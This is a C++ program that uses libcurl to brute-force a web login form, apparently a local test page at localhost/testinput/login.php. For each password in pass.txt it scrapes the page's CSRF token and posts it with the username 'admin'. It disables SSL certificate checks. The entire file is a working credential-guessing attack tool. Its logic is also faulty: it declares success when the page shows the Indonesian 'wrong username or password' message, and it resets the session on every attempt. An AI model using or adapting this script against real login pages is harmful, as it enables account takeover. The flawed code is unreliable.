#include <iostream>
#include <string>
#include <fstream>
#include <curl/curl.h>

using namespace std;

// Callback function for libcurl to write response data into a string
size_t WriteCallback(void* contents, size_t size, size_t nmemb, string* output) {
    size_t totalSize = size * nmemb;
    output->append((char*)contents, totalSize);
    return totalSize;
}

// Function to extract token from HTML
string extractToken(const string& html) {
    string token;
    size_t pos = html.find("name=\"token\"");
    if (pos != string::npos) {
        size_t tagStart = html.rfind("<input", pos);
        if (tagStart != string::npos) {
            size_t tagEnd = html.find(">", tagStart);
            if (tagEnd != string::npos) {
                string inputElement = html.substr(tagStart, tagEnd - tagStart + 1);
                size_t valuePos = inputElement.find("value=\"");
                if (valuePos != string::npos) {
                    valuePos += 7;
                    size_t valueEnd = inputElement.find("\"", valuePos);
                    if (valueEnd != string::npos) {
                        token = inputElement.substr(valuePos, valueEnd - valuePos);
                    }
                }
            }
        }
    }
    return token;
}

// Function to perform login
// Function to perform login
bool login(CURL* curl, const string& username, const string& password, const string& token, string& responseData) {
    curl_easy_setopt(curl, CURLOPT_URL, "http://localhost/testinput/login.php");

    // Encode token, username, and password for use in URL
    string encodedToken = curl_easy_escape(curl, token.c_str(), token.length());
    string encodedUsername = curl_easy_escape(curl, username.c_str(), username.length());
    string encodedPassword = curl_easy_escape(curl, password.c_str(), password.length());

    string postData = "token=" + encodedToken + "&username=" + encodedUsername + "&password=" + encodedPassword + "&login=1";
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());

    // Cleanup encoded strings
    // curl_free(&encodedToken);  // No need to free the token here
    // curl_free(&encodedUsername);  // No need to free the username here
    // curl_free(&encodedPassword);  // No need to free the password here

    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &responseData);

    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << endl;
        return false;
    }
    return true;
}


// Function to get login page and extract token
bool getLoginPageAndToken(CURL* curl, string& responseData, string& token) {
    responseData.clear();
    curl_easy_setopt(curl, CURLOPT_URL, "http://localhost/testinput/login.php");
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &responseData);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << endl;
        return false;
    }

    token = extractToken(responseData);
    if (token.empty()) {
        cerr << "Failed to extract token from HTML." << endl;
        cerr << "HTML content: " << responseData << endl;  // Debug the HTML content
        return false;
    }

    return true;
}

int main() {
    CURL* curl = curl_easy_init();
    if (!curl) {
        cerr << "Error initializing curl." << endl;
        return 1;
    }

    ifstream inputFile("pass.txt");
    if (!inputFile.is_open()) {
        cerr << "Failed to open pass.txt" << endl;
        curl_easy_cleanup(curl);
        return 1;
    }

    string username = "admin"; // Change to your username
    string password;
    bool success = false;

    while (getline(inputFile, password)) {
        string responseData;
        string token;

        curl_easy_reset(curl); // Reset curl to ensure a fresh session

        if (!getLoginPageAndToken(curl, responseData, token)) {
            cerr << "Failed to get login page or extract token." << endl;
            continue;
        }

        cout << "Extracted Token: " << token << endl;

        responseData.clear();

        // Log the POST data for debugging
        string postData = "token=" + token + "&username=" + username + "&password=" + password + "&login=submit";
        cout << "POST Data: " << postData << endl;

        if (login(curl, username, password, token, responseData)) {
            // Check for successful login indication
            if (responseData.find("Username atau password salah.") != string::npos) {
                cout << "Login successful with password: " << password << endl;
                success = true;
                break;
            } else {
                cout << "Login failed with password: " << password << endl;
            }
        } else {
            cerr << "Request failed with password: " << password << endl;
        }
    }

    if (!success) {
        cout << "Failed to login after trying all passwords." << endl;
    }

    inputFile.close();
    curl_easy_cleanup(curl);

    return 0;
}

